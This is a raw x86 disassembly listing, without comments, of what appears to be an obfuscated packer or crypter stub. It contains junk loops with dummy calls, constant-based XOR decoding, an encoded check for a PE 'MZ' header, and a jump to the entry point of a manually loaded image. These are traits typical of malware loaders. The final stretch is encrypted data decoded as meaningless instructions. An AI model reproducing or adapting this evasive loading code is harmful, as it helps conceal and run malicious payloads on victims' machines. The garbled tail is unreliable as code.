  409d82:	mov    edx,DWORD PTR ds:0x41abd6
  409d88:	dec    edx
  409d89:	mov    DWORD PTR ds:0x41abd6,edx
  409d8f:	mov    edx,DWORD PTR ds:0x41abd6
  409d95:	dec    edx
  409d96:	mov    DWORD PTR ds:0x41abd6,edx
  409d9c:	jmp    0x409d50
  409da1:	and    DWORD PTR [ebp-0x4],edi
  409da4:	and    ecx,ecx
  409da6:	mov    ecx,DWORD PTR [ebp-0x4]
  409da9:	inc    edx
  409daa:	imul   ecx,ecx,0x7f659e30
  409db0:	mov    DWORD PTR [ebp-0x4],ecx
  409db3:	mov    edx,DWORD PTR ds:0x412364
  409db9:	xor    edx,DWORD PTR ds:0x4245ae
  409dbf:	mov    DWORD PTR ds:0x412364,edx
  409dc5:	or     DWORD PTR [ebp-0x4],esi
  409dc8:	mov    DWORD PTR ds:0x415105,0x4568
  409dd2:	mov    ecx,DWORD PTR [ebp-0x4]
  409dd5:	mov    edx,DWORD PTR ds:0x415115
  409ddb:	mov    edx,DWORD PTR [ebp-0xc]
  409dde:	cmp    ecx,DWORD PTR [edx]
  409de0:	jne    0x40a327
  409de6:	inc    eax
  409de7:	mov    DWORD PTR ds:0x4245ae,0x6f03
  409df1:	cmp    eax,0x4
  409df4:	jb     0x409d43
  409dfa:	xor    eax,eax
  409dfc:	sbb    DWORD PTR ds:0x412360,edx
  409e02:	shl    DWORD PTR [ebp-0x4],1
  409e05:	and    DWORD PTR [ebp-0x4],edi
  409e08:	mov    ecx,DWORD PTR [ebp-0x4]
  409e0b:	and    DWORD PTR ds:0x417e4d,0x0
  409e15:	mov    edx,DWORD PTR ds:0x417e4d
  409e1b:	inc    edx
  409e1c:	mov    DWORD PTR ds:0x417e4d,edx
  409e22:	cmp    DWORD PTR ds:0x417e4d,0xa
  409e29:	jne    0x409e4c
  409e2f:	push   DWORD PTR [ebp-0x20]
  409e32:	push   0x8411
  409e37:	push   0x41ad5b
  409e3c:	push   0x41adfd
  409e41:	push   0x1dc1
  409e46:	call   DWORD PTR ds:0x40d010
  409e4c:	cmp    DWORD PTR ds:0x417e4d,0x9
  409e53:	jne    0x409e68
  409e59:	xor    edx,edx
  409e5b:	or     edx,DWORD PTR ds:0x417e4d
  409e61:	inc    edx
  409e62:	mov    DWORD PTR ds:0x417e4d,edx
  409e68:	cmp    DWORD PTR ds:0x417e4d,0x19
  409e6f:	jb     0x409e15
  409e75:	mov    edx,DWORD PTR ds:0x417eaa
  409e7b:	mov    edx,DWORD PTR [edx]
  409e7d:	xor    DWORD PTR ds:0x41abda,edx
  409e83:	imul   ecx,ecx,0x7f659e30
  409e89:	mov    edx,DWORD PTR ds:0x412374
  409e8f:	sub    DWORD PTR ds:0x415111,edx
  409e95:	mov    DWORD PTR [ebp-0x4],ecx
  409e98:	and    edx,edx
  409e9a:	or     DWORD PTR [ebp-0x4],esi
  409e9d:	mov    ecx,DWORD PTR [ebp-0x4]
  409ea0:	mov    edx,DWORD PTR [ebp-0xc]
  409ea3:	mov    DWORD PTR ds:0x4245ba,0xa9e
  409ead:	cmp    ecx,DWORD PTR [edx]
  409eaf:	jne    0x40a327
  409eb5:	mov    DWORD PTR ds:0x4150fd,0x72ef
  409ebf:	inc    eax
  409ec0:	cmp    eax,0x4
  409ec3:	mov    DWORD PTR ds:0x412370,0x6303
  409ecd:	jb     0x409dfc
  409ed3:	xor    eax,eax
  409ed5:	and    DWORD PTR ds:0x4150fd,0x0
  409edf:	xor    ecx,ecx
  409ee1:	add    ecx,DWORD PTR ds:0x4150fd
  409ee7:	inc    ecx
  409ee8:	mov    DWORD PTR ds:0x4150fd,ecx
  409eee:	cmp    DWORD PTR ds:0x4150fd,0x28
  409ef5:	jne    0x409f04
  409efb:	push   DWORD PTR [ebp-0x24]
  409efe:	call   DWORD PTR ds:0x40d014
  409f04:	cmp    DWORD PTR ds:0x4150fd,0x18
  409f0b:	jb     0x409edf
  409f11:	add    DWORD PTR ds:0x417e59,0x412378
  409f1b:	shl    DWORD PTR [ebp-0x4],1
  409f1e:	and    DWORD PTR [ebp-0x4],edi
  409f21:	and    DWORD PTR ds:0x412360,0x0
  409f2b:	jmp    0x409f3f
  409f30:	xor    edx,edx
  409f32:	or     edx,DWORD PTR ds:0x412360
  409f38:	inc    edx
  409f39:	mov    DWORD PTR ds:0x412360,edx
  409f3f:	cmp    DWORD PTR ds:0x412360,0x11
  409f46:	jae    0x409f85
  409f4c:	cmp    DWORD PTR ds:0x412360,0x1a
  409f53:	jne    0x409f80
  409f59:	push   0x415119
  409f5e:	push   0x8b4a
  409f63:	push   DWORD PTR [ebp-0x24]
  409f66:	push   0x89fe
  409f6b:	push   0x7f12
  409f70:	push   0x7c49
  409f75:	push   0x1205
  409f7a:	call   DWORD PTR ds:0x40d200
  409f80:	jmp    0x409f30
  409f85:	mov    ecx,DWORD PTR [ebp-0x4]
  409f88:	imul   ecx,ecx,0x7f659e30
  409f8e:	mov    DWORD PTR [ebp-0x4],ecx
  409f91:	or     DWORD PTR [ebp-0x4],esi
  409f94:	mov    ecx,DWORD PTR [ebp-0x4]
  409f97:	mov    edx,DWORD PTR [ebp-0xc]
  409f9a:	mov    DWORD PTR ds:0x4245b6,0x2f25
  409fa4:	cmp    ecx,DWORD PTR [edx]
  409fa6:	mov    DWORD PTR ds:0x412358,0x1252
  409fb0:	jne    0x40a327
  409fb6:	inc    eax
  409fb7:	cmp    eax,0x4
  409fba:	mov    DWORD PTR ds:0x4245ca,0x48e
  409fc4:	jb     0x409ed5
  409fca:	mov    DWORD PTR ds:0x417e55,0x10
  409fd4:	cmp    DWORD PTR ds:0x417e55,0x0
  409fdb:	je     0x40a032
  409fe1:	cmp    DWORD PTR ds:0x417e55,0x19
  409fe8:	jne    0x40a00e
  409fee:	push   DWORD PTR [ebp-0x24]
  409ff1:	push   0x4245ca
  409ff6:	push   DWORD PTR [ebp-0x28]
  409ff9:	push   0x41ada3
  409ffe:	push   0x6e83
  40a003:	push   0x54b6
  40a008:	call   DWORD PTR ds:0x40d204
  40a00e:	mov    edx,DWORD PTR ds:0x417e55
  40a014:	dec    edx
  40a015:	mov    DWORD PTR ds:0x417e55,edx
  40a01b:	jmp    0x409fd4
  40a020:	mov    ecx,DWORD PTR ds:0x40eecc
  40a026:	mov    edx,DWORD PTR ds:0x417eba
  40a02c:	sub    ecx,edx
  40a02e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40a032:	xor    eax,eax
  40a034:	shl    DWORD PTR [ebp-0x4],1
  40a037:	and    DWORD PTR [ebp-0x4],edi
  40a03a:	or     ecx,ecx
  40a03c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a03f:	xor    edx,DWORD PTR ds:0x417e51
  40a045:	imul   ecx,ecx,0x7f659e30
  40a04b:	mov    DWORD PTR ds:0x417e49,0x1d
  40a055:	cmp    DWORD PTR ds:0x417e49,0x0
  40a05c:	je     0x40a0b0
  40a062:	cmp    DWORD PTR ds:0x417e49,0x7
  40a069:	jne    0x40a07a
  40a06f:	push   0x45c2
  40a074:	call   DWORD PTR ds:0x40d208
  40a07a:	cmp    DWORD PTR ds:0x417e49,0x8
  40a081:	jne    0x40a094
  40a087:	mov    edx,DWORD PTR ds:0x417e49
  40a08d:	dec    edx
  40a08e:	mov    DWORD PTR ds:0x417e49,edx
  40a094:	mov    edx,DWORD PTR ds:0x417e49
  40a09a:	dec    edx
  40a09b:	mov    DWORD PTR ds:0x417e49,edx
  40a0a1:	jmp    0x40a055
  40a0a6:	adc    DWORD PTR ds:0x417e45,0x449b
  40a0b0:	mov    DWORD PTR [ebp-0x4],ecx
  40a0b3:	or     ecx,edx
  40a0b5:	or     DWORD PTR [ebp-0x4],esi
  40a0b8:	mov    edx,0x1393
  40a0bd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a0c0:	mov    edx,DWORD PTR [ebp-0xc]
  40a0c3:	mov    DWORD PTR ds:0x41abda,0x516c
  40a0cd:	cmp    ecx,DWORD PTR [edx]
  40a0cf:	jne    0x40a327
  40a0d5:	mov    DWORD PTR ds:0x415111,0x4e99
  40a0df:	inc    eax
  40a0e0:	mov    DWORD PTR ds:0x4245c2,0x1c73
  40a0ea:	cmp    eax,0x4
  40a0ed:	jb     0x40a034
  40a0f3:	xor    eax,eax
  40a0f5:	or     DWORD PTR ds:0x41236c,0x38d4
  40a0ff:	shl    DWORD PTR [ebp-0x4],1
  40a102:	and    DWORD PTR [ebp-0x4],edi
  40a105:	and    ecx,DWORD PTR ds:0x417e59
  40a10b:	mov    ecx,DWORD PTR [ebp-0x4]
  40a10e:	adc    DWORD PTR ds:0x4245be,0x729e
  40a118:	imul   ecx,ecx,0x7f659e30
  40a11e:	adc    edx,0x9b0
  40a124:	mov    DWORD PTR [ebp-0x4],ecx
  40a127:	xor    edx,edx
  40a129:	or     edx,DWORD PTR ds:0x417e55
  40a12f:	xor    DWORD PTR ds:0x4245c6,edx
  40a135:	or     DWORD PTR [ebp-0x4],esi
  40a138:	mov    ecx,DWORD PTR [ebp-0x4]
  40a13b:	mov    edx,DWORD PTR [ebp-0xc]
  40a13e:	mov    DWORD PTR ds:0x4245b6,0xce5
  40a148:	cmp    ecx,DWORD PTR [edx]
  40a14a:	jne    0x40a327
  40a150:	mov    DWORD PTR ds:0x41abd6,0x18a3
  40a15a:	inc    eax
  40a15b:	mov    DWORD PTR ds:0x4245ae,0x5769
  40a165:	cmp    eax,0x4
  40a168:	mov    DWORD PTR ds:0x412358,0x5fb5
  40a172:	jb     0x40a0f5
  40a178:	sbb    ecx,DWORD PTR ds:0x417e59
  40a17e:	xor    eax,eax
  40a180:	mov    DWORD PTR ds:0x412360,0x14
  40a18a:	cmp    DWORD PTR ds:0x412360,0x0
  40a191:	je     0x40a1c1
  40a197:	cmp    DWORD PTR ds:0x412360,0x19
  40a19e:	jne    0x40a1af
  40a1a4:	push   0x2f20
  40a1a9:	call   DWORD PTR ds:0x40d018
  40a1af:	mov    edx,DWORD PTR ds:0x412360
  40a1b5:	dec    edx
  40a1b6:	mov    DWORD PTR ds:0x412360,edx
  40a1bc:	jmp    0x40a18a
  40a1c1:	shl    DWORD PTR [ebp-0x4],1
  40a1c4:	mov    DWORD PTR ds:0x41abe2,0x14
  40a1ce:	cmp    DWORD PTR ds:0x41abe2,0x0
  40a1d5:	je     0x40a233
  40a1db:	cmp    DWORD PTR ds:0x41abe2,0x5
  40a1e2:	jne    0x40a203
  40a1e8:	push   0x1b4e
  40a1ed:	push   DWORD PTR [ebp-0x1c]
  40a1f0:	push   0x1704
  40a1f5:	push   0x41abf4
  40a1fa:	push   DWORD PTR [ebp-0x10]
  40a1fd:	call   DWORD PTR ds:0x40d01c
  40a203:	cmp    DWORD PTR ds:0x41abe2,0x6
  40a20a:	jne    0x40a21d
  40a210:	mov    edx,DWORD PTR ds:0x41abe2
  40a216:	dec    edx
  40a217:	mov    DWORD PTR ds:0x41abe2,edx
  40a21d:	xor    edx,edx
  40a21f:	add    edx,DWORD PTR ds:0x41abe2
  40a225:	dec    edx
  40a226:	mov    DWORD PTR ds:0x41abe2,edx
  40a22c:	jmp    0x40a1ce
  40a231:	neg    edx
  40a233:	and    DWORD PTR [ebp-0x4],edi
  40a236:	mov    ecx,DWORD PTR [ebp-0x4]
  40a239:	neg    edx
  40a23b:	imul   ecx,ecx,0x7f659e30
  40a241:	xor    edx,DWORD PTR ds:0x41abd2
  40a247:	mov    DWORD PTR [ebp-0x4],ecx
  40a24a:	adc    DWORD PTR ds:0x4245b6,ebx
  40a250:	or     DWORD PTR [ebp-0x4],esi
  40a253:	mov    edx,0x77ca
  40a258:	mov    ecx,DWORD PTR [ebp-0x4]
  40a25b:	mov    edx,DWORD PTR [ebp-0xc]
  40a25e:	mov    DWORD PTR ds:0x41510d,0x1bcb
  40a268:	cmp    ecx,DWORD PTR [edx]
  40a26a:	mov    DWORD PTR ds:0x412354,0x3513
  40a274:	jne    0x40a327
  40a27a:	inc    eax
  40a27b:	cmp    eax,0x4
  40a27e:	mov    DWORD PTR ds:0x417e49,0x110e
  40a288:	jb     0x40a180
  40a28e:	xor    eax,eax
  40a290:	shl    DWORD PTR [ebp-0x4],1
  40a293:	and    DWORD PTR [ebp-0x4],edi
  40a296:	mov    ecx,DWORD PTR [ebp-0x4]
  40a299:	imul   ecx,ecx,0x7f659e30
  40a29f:	mov    DWORD PTR [ebp-0x4],ecx
  40a2a2:	or     DWORD PTR [ebp-0x4],esi
  40a2a5:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a8:	mov    edx,DWORD PTR [ebp-0xc]
  40a2ab:	cmp    ecx,DWORD PTR [edx]
  40a2ad:	jne    0x40a327
  40a2b3:	inc    eax
  40a2b4:	cmp    eax,0x4
  40a2b7:	jb     0x40a290
  40a2bd:	inc    ebx
  40a2be:	cmp    ebx,0x10
  40a2c1:	jb     0x409b50
  40a2c7:	mov    ebx,0xf89c8538
  40a2cc:	mov    DWORD PTR [ebp-0xc],ebx
  40a2cf:	mov    DWORD PTR [ebp-0x8],0xf89c853b
  40a2d6:	lea    eax,[ebp-0x1c]
  40a2d9:	mov    DWORD PTR [ebp-0x18],eax
  40a2dc:	lea    eax,[ebp-0x20]
  40a2df:	mov    DWORD PTR [ebp-0x10],eax
  40a2e2:	mov    eax,ds:0x40d5d0
  40a2e7:	mov    eax,DWORD PTR [eax+0x1c8]
  40a2ed:	mov    eax,DWORD PTR [eax]
  40a2ef:	mov    ecx,DWORD PTR [ebp-0x10]
  40a2f2:	mov    esi,0x7510859
  40a2f7:	xor    eax,esi
  40a2f9:	mov    edi,0x32729f
  40a2fe:	add    eax,edi
  40a300:	mov    DWORD PTR [ecx],eax
  40a302:	mov    eax,ds:0x40d854
  40a307:	cmp    eax,0x23d14057
  40a30c:	mov    eax,DWORD PTR [ebp-0x8]
  40a30f:	je     0x40a32e
  40a315:	mov    ecx,DWORD PTR [ebp-0xc]
  40a318:	xor    eax,esi
  40a31a:	add    eax,edi
  40a31c:	imul   eax,ecx
  40a31f:	mov    DWORD PTR [ebp-0xc],eax
  40a322:	jmp    0x40a371
  40a327:	xor    eax,eax
  40a329:	jmp    0x40a5d0
  40a32e:	xor    eax,esi
  40a330:	add    eax,edi
  40a332:	mov    ds:0x40d6e0,eax
  40a337:	mov    eax,DWORD PTR [ebp-0xc]
  40a33a:	xor    eax,esi
  40a33c:	add    eax,edi
  40a33e:	mov    ds:0x40d854,eax
  40a343:	mov    eax,DWORD PTR [ebp-0x8]
  40a346:	mov    ecx,DWORD PTR ds:0x40d6e0
  40a34c:	xor    eax,esi
  40a34e:	add    eax,edi
  40a350:	cmp    ecx,eax
  40a352:	jne    0x40a371
  40a358:	push   0x40d72c
  40a35d:	call   DWORD PTR ds:0x40d1ec
  40a363:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a369:	mov    ecx,DWORD PTR [ecx+0x198]
  40a36f:	mov    DWORD PTR [ecx],eax
  40a371:	mov    eax,ds:0x40d5d0
  40a376:	mov    eax,DWORD PTR [eax+0x18c]
  40a37c:	mov    eax,DWORD PTR [eax]
  40a37e:	mov    DWORD PTR [ebp-0x24],eax
  40a381:	mov    eax,0xf89c853c
  40a386:	mov    DWORD PTR [ebp-0x28],eax
  40a389:	mov    DWORD PTR [ebp-0x28],eax
  40a38c:	mov    DWORD PTR [ebp-0x28],eax
  40a38f:	mov    DWORD PTR [ebp-0x10],ebx
  40a392:	mov    DWORD PTR [ebp-0x28],eax
  40a395:	mov    DWORD PTR [ebp-0x28],0xf89c8530
  40a39c:	mov    ebx,DWORD PTR [ebp-0xc]
  40a39f:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3a2:	mov    edx,DWORD PTR [ebp-0x8]
  40a3a5:	xor    edx,esi
  40a3a7:	xor    ecx,esi
  40a3a9:	add    ecx,edx
  40a3ab:	mov    edx,DWORD PTR [ebp-0x8]
  40a3ae:	xor    ebx,esi
  40a3b0:	xor    edx,esi
  40a3b2:	add    ebx,edi
  40a3b4:	lea    ecx,[ecx+edx*1+0x9757dd]
  40a3bb:	cmp    ebx,ecx
  40a3bd:	ja     0x40a41e
  40a3c3:	mov    eax,DWORD PTR [ebp-0x8]
  40a3c6:	xor    eax,esi
  40a3c8:	lea    eax,[eax+ebx*1+0x32729f]
  40a3cf:	push   eax
  40a3d0:	mov    eax,DWORD PTR [ebp-0x10]
  40a3d3:	xor    eax,esi
  40a3d5:	lea    eax,[ebp+eax*1+0x3272a7]
  40a3dc:	push   eax
  40a3dd:	mov    eax,ds:0x40d5d0
  40a3e2:	push   DWORD PTR [eax+0x1bc]
  40a3e8:	call   0x40742d
  40a3ed:	mov    eax,DWORD PTR [ebp-0x8]
  40a3f0:	xor    eax,esi
  40a3f2:	lea    ebx,[ebx+eax*1+0x32729f]
  40a3f9:	mov    eax,DWORD PTR [ebp-0x8]
  40a3fc:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3ff:	xor    ecx,esi
  40a401:	xor    eax,esi
  40a403:	add    eax,ecx
  40a405:	mov    ecx,DWORD PTR [ebp-0x8]
  40a408:	xor    ecx,esi
  40a40a:	lea    eax,[eax+ecx*1+0x9757dd]
  40a411:	cmp    ebx,eax
  40a413:	jbe    0x40a3c3
  40a419:	mov    eax,0xf89c853c
  40a41e:	mov    ecx,DWORD PTR [ebp+0xc]
  40a421:	mov    DWORD PTR ds:0x40d454,ecx
  40a427:	mov    ecx,DWORD PTR [ebp+0x10]
  40a42a:	mov    DWORD PTR ds:0x40d6a8,ecx
  40a430:	mov    ecx,DWORD PTR ds:0x40d454
  40a436:	mov    edx,DWORD PTR [ebp-0x18]
  40a439:	sub    ecx,edi
  40a43b:	xor    ecx,esi
  40a43d:	mov    DWORD PTR [edx],ecx
  40a43f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a442:	cmp    ecx,0xf89c853b
  40a448:	je     0x40a4a5
  40a44e:	mov    ecx,DWORD PTR [ebp-0xc]
  40a451:	mov    edx,DWORD PTR [ebp-0x20]
  40a454:	xor    ecx,esi
  40a456:	add    ecx,edi
  40a458:	cmp    ecx,edx
  40a45a:	je     0x40a4a5
  40a460:	mov    eax,ds:0x40d5d0
  40a465:	mov    eax,DWORD PTR [eax+0x194]
  40a46b:	mov    ecx,DWORD PTR [eax]
  40a46d:	mov    eax,DWORD PTR [ecx+0x3c]
  40a470:	push   DWORD PTR ds:0x40d6a8
  40a476:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a47a:	push   DWORD PTR ds:0x40d454
  40a480:	add    eax,ecx
  40a482:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a488:	mov    ecx,DWORD PTR [ecx+0x194]
  40a48e:	push   DWORD PTR [ecx]
  40a490:	call   eax
  40a492:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a498:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a49e:	mov    DWORD PTR [ecx],eax
  40a4a0:	jmp    0x40a5b5
  40a4a5:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4a8:	mov    edx,DWORD PTR [ebp-0x24]
  40a4ab:	xor    ecx,esi
  40a4ad:	add    ecx,edi
  40a4af:	cmp    ecx,edx
  40a4b1:	jne    0x40a598
  40a4b7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4ba:	xor    ecx,esi
  40a4bc:	add    ecx,edi
  40a4be:	mov    DWORD PTR ds:0x40d654,ecx
  40a4c4:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4c7:	xor    ecx,esi
  40a4c9:	add    ecx,edi
  40a4cb:	mov    DWORD PTR ds:0x40d64c,ecx
  40a4d1:	mov    ecx,DWORD PTR [ebp-0x8]
  40a4d4:	mov    DWORD PTR [ebp-0x10],ecx
  40a4d7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4da:	mov    DWORD PTR [ebp+0xc],ecx
  40a4dd:	mov    ecx,DWORD PTR [ebp+0xc]
  40a4e0:	xor    ecx,esi
  40a4e2:	add    ecx,edi
  40a4e4:	mov    DWORD PTR [ebp+0xc],ecx
  40a4e7:	mov    ecx,DWORD PTR ds:0x40d450
  40a4ed:	mov    ecx,DWORD PTR [ecx]
  40a4ef:	mov    DWORD PTR [ebp+0xc],ecx
  40a4f2:	mov    ecx,DWORD PTR ds:0x40d658
  40a4f8:	mov    ecx,DWORD PTR [ecx]
  40a4fa:	mov    DWORD PTR [ebp-0x18],ecx
  40a4fd:	mov    DWORD PTR [ebp+0x10],0xf89c8738
  40a504:	mov    ecx,DWORD PTR [ebp+0x10]
  40a507:	xor    ecx,esi
  40a509:	add    ecx,edi
  40a50b:	mov    DWORD PTR [ebp+0x10],ecx
  40a50e:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a514:	mov    DWORD PTR [ebp+0x10],ecx
  40a517:	mov    ecx,DWORD PTR [ebp+0xc]
  40a51a:	mov    DWORD PTR [ebp+0xc],ecx
  40a51d:	mov    ecx,DWORD PTR [ebp+0xc]
  40a520:	push   0x4
  40a522:	pop    edx
  40a523:	sub    edx,ecx
  40a525:	add    edx,DWORD PTR [ebp-0x18]
  40a528:	mov    DWORD PTR [ebp-0x28],0xf89c85f8
  40a52f:	mov    DWORD PTR [ebp+0x10],edx
  40a532:	mov    DWORD PTR [ebp-0x74],eax
  40a535:	mov    eax,DWORD PTR [ebp+0xc]
  40a538:	mov    DWORD PTR [ebp-0x70],eax
  40a53b:	mov    eax,DWORD PTR [ebp+0x10]
  40a53e:	mov    DWORD PTR [ebp-0x6c],eax
  40a541:	mov    eax,DWORD PTR [ebp-0x28]
  40a544:	xor    eax,esi
  40a546:	add    eax,edi
  40a548:	mov    DWORD PTR [ebp-0x68],eax
  40a54b:	lea    eax,[ebp-0x30]
  40a54e:	mov    DWORD PTR [ebp-0x64],eax
  40a551:	mov    eax,DWORD PTR [ebp-0x74]
  40a554:	xor    eax,esi
  40a556:	add    eax,edi
  40a558:	mov    DWORD PTR [ebp-0x74],eax
  40a55b:	lea    eax,[ebp-0x74]
  40a55e:	push   eax
  40a55f:	mov    eax,DWORD PTR [ebp-0x10]
  40a562:	xor    eax,esi
  40a564:	add    eax,edi
  40a566:	push   eax
  40a567:	mov    eax,ds:0x40d5f0
  40a56c:	push   0x40d546
  40a571:	push   DWORD PTR [eax]
  40a573:	call   0x40ae4d
  40a578:	xor    esi,esi
  40a57a:	mov    eax,DWORD PTR [ebp+0x10]
  40a57d:	sub    eax,esi
  40a57f:	push   eax
  40a580:	mov    eax,DWORD PTR [ebp+0xc]
  40a583:	add    eax,esi
  40a585:	push   eax
  40a586:	call   0x4059cb
  40a58b:	inc    esi
  40a58c:	cmp    esi,0x52
  40a58f:	jb     0x40a57a
  40a595:	mov    eax,DWORD PTR [ebp-0x10]
  40a598:	call   0x404704
  40a59d:	lea    eax,[ebp+0x4]
  40a5a0:	mov    DWORD PTR [ebp-0x2c],eax
  40a5a3:	mov    eax,DWORD PTR [ebp-0x14]
  40a5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40a5a9:	push   DWORD PTR [ebp-0xc]
  40a5ac:	lea    eax,[ebp-0x2c]
  40a5af:	push   eax
  40a5b0:	call   0x407c0a
  40a5b5:	mov    eax,ds:0x40d5d0
  40a5ba:	push   0x4
  40a5bc:	add    eax,0x1cc
  40a5c1:	push   eax
  40a5c2:	lea    eax,[ebp-0x14]
  40a5c5:	push   eax
  40a5c6:	call   0x40742d
  40a5cb:	mov    eax,DWORD PTR [ebp-0x14]
  40a5ce:	mov    eax,DWORD PTR [eax]
  40a5d0:	pop    edi
  40a5d1:	pop    esi
  40a5d2:	pop    ebx
  40a5d3:	leave  
  40a5d4:	ret    0xc
  40a5d7:	push   ebp
  40a5d8:	mov    ebp,esp
  40a5da:	sub    esp,0x14
  40a5dd:	leave  
  40a5de:	ret    0x4
  40a5e1:	push   ebp
  40a5e2:	mov    ebp,esp
  40a5e4:	push   ecx
  40a5e5:	or     eax,0x5cec
  40a5ea:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40a5f1:	add    eax,0x77b5
  40a5f6:	mov    eax,DWORD PTR [ebp+0x8]
  40a5f9:	mov    al,BYTE PTR [eax]
  40a5fb:	add    DWORD PTR ds:0x412354,0x2449
  40a605:	add    al,0x34
  40a607:	sbb    DWORD PTR ds:0x41237c,0x412364
  40a611:	xor    al,0x4a
  40a613:	cmp    al,0xcb
  40a615:	mov    DWORD PTR ds:0x4245c2,0x6064
  40a61f:	jne    0x40a6b9
  40a625:	mov    eax,DWORD PTR [ebp+0x8]
  40a628:	mov    ecx,DWORD PTR [ebp+0x8]
  40a62b:	add    ecx,DWORD PTR [eax+0x3c]
  40a62e:	mov    edx,0x7510859
  40a633:	and    DWORD PTR ds:0x412368,0x0
  40a63d:	mov    eax,ds:0x412368
  40a642:	inc    eax
  40a643:	mov    ds:0x412368,eax
  40a648:	cmp    DWORD PTR ds:0x412368,0xe
  40a64f:	jne    0x40a663
  40a655:	push   0x41236c
  40a65a:	push   DWORD PTR [ebp-0x10]
  40a65d:	call   DWORD PTR ds:0x40d398
  40a663:	cmp    DWORD PTR ds:0x412368,0xd
  40a66a:	jne    0x40a67b
  40a670:	mov    eax,ds:0x412368
  40a675:	inc    eax
  40a676:	mov    ds:0x412368,eax
  40a67b:	cmp    DWORD PTR ds:0x412368,0x1f
  40a682:	jb     0x40a63d
  40a688:	mov    DWORD PTR [ebp+0x8],ecx
  40a68b:	mov    eax,DWORD PTR [ebp-0x4]
  40a68e:	xor    eax,edx
  40a690:	push   esi
  40a691:	mov    esi,DWORD PTR [ebp+0x8]
  40a694:	mov    ecx,0x32729f
  40a699:	add    eax,ecx
  40a69b:	cmp    DWORD PTR [esi+0x54],eax
  40a69e:	pop    esi
  40a69f:	je     0x40a6ad
  40a6a5:	mov    eax,DWORD PTR [ebp+0x8]
  40a6a8:	jmp    0x40a6c6
  40a6ad:	mov    eax,DWORD PTR [ebp-0x4]
  40a6b0:	xor    eax,edx
  40a6b2:	add    eax,ecx
  40a6b4:	jmp    0x40a6c6
  40a6b9:	mov    eax,DWORD PTR [ebp-0x4]
  40a6bc:	xor    eax,0x7510859
  40a6c1:	add    eax,0x32729f
  40a6c6:	leave  
  40a6c7:	ret    0x4
  40a6ca:	push   ebp
  40a6cb:	mov    ebp,esp
  40a6cd:	push   ecx
  40a6ce:	mov    DWORD PTR ds:0x417e41,0x1a
  40a6d8:	cmp    DWORD PTR ds:0x417e41,0x0
  40a6df:	je     0x40a739
  40a6e5:	cmp    DWORD PTR ds:0x417e41,0x4
  40a6ec:	jne    0x40a70f
  40a6f2:	push   0x6416
  40a6f7:	push   0x57a6
  40a6fc:	push   0x7327
  40a701:	push   DWORD PTR [ebp-0xc]
  40a704:	push   0x1809
  40a709:	call   DWORD PTR ds:0x40d39c
  40a70f:	cmp    DWORD PTR ds:0x417e41,0x5
  40a716:	jne    0x40a727
  40a71c:	mov    eax,ds:0x417e41
  40a721:	dec    eax
  40a722:	mov    ds:0x417e41,eax
  40a727:	mov    eax,ds:0x417e41
  40a72c:	dec    eax
  40a72d:	mov    ds:0x417e41,eax
  40a732:	jmp    0x40a6d8
  40a737:	sub    edx,edx
  40a739:	push   ecx
  40a73a:	sub    edx,eax
  40a73c:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40a743:	and    DWORD PTR ds:0x412358,0x0
  40a74d:	jmp    0x40a761
  40a752:	xor    edx,edx
  40a754:	add    edx,DWORD PTR ds:0x412358
  40a75a:	inc    edx
  40a75b:	mov    DWORD PTR ds:0x412358,edx
  40a761:	cmp    DWORD PTR ds:0x412358,0x11
  40a768:	jae    0x40a79c
  40a76e:	cmp    DWORD PTR ds:0x412358,0x18
  40a775:	jne    0x40a791
  40a77b:	push   0x4012
  40a780:	push   DWORD PTR [ebp-0xc]
  40a783:	push   0x7b7f
  40a788:	push   DWORD PTR [ebp-0xc]
  40a78b:	call   DWORD PTR ds:0x40d020
  40a791:	jmp    0x40a752
  40a796:	sub    DWORD PTR ds:0x4245ae,ebx
  40a79c:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  40a7a3:	jmp    0x40a91b
  40a7a8:	(bad)  
  40a7a9:	jmp    0x40a73d
  40a7ab:	aam    0x78
  40a7ad:	push   ebp
  40a7ae:	pop    ecx
  40a7af:	jnp    0x40a756
  40a7b1:	fwait
  40a7b2:	jne    0x40a830
  40a7b4:	lods   eax,DWORD PTR ds:[esi]
  40a7b5:	jp     0x40a77d
  40a7b7:	mov    al,ds:0x7e7e2505
  40a7bc:	lds    edi,FWORD PTR [edi+0x7e]
  40a7bf:	jle    0x40a7ba
  40a7c1:	mov    dl,0x44
  40a7c3:	push   0x3f
  40a7c5:	jae    0x40a7a8
  40a7c7:	cmp    al,0xcc
  40a7c9:	out    0xa9,eax
  40a7cb:	imul   ebp,DWORD PTR [ebp+0x17c4e081],0x4f
  40a7d2:	inc    eax
  40a7d3:	jo     0x40a766
  40a7d5:	je     0x40a7ad
  40a7d7:	lds    esi,FWORD PTR [edx-0x6e51c829]
  40a7dd:	pop    esi
  40a7de:	clc    
  40a7df:	repnz (bad) 
  40a7e1:	xchg   ebx,eax
  40a7e2:	mov    al,0x44
  40a7e4:	in     eax,dx
  40a7e5:	(bad)  
  40a7e7:	fcom   st(7)
  40a7e9:	pop    esi
  40a7ea:	jle    0x40a7b0
  40a7ec:	and    eax,0x878041f2
  40a7f1:	push   0x71
  40a7f3:	retf   
  40a7f4:	pop    ss
  40a7f5:	or     al,0xe5
  40a7f7:	cld    
  40a7f8:	(bad)
  40a7fb:	call   0xa256:0x4d154154
  40a802:	int3   
  40a803:	rcr    BYTE PTR [ebx],cl
  40a805:	lahf   
  40a806:	por    mm0,mm3
  40a809:	inc    eax
  40a80a:	into   
  40a80b:	dec    esp
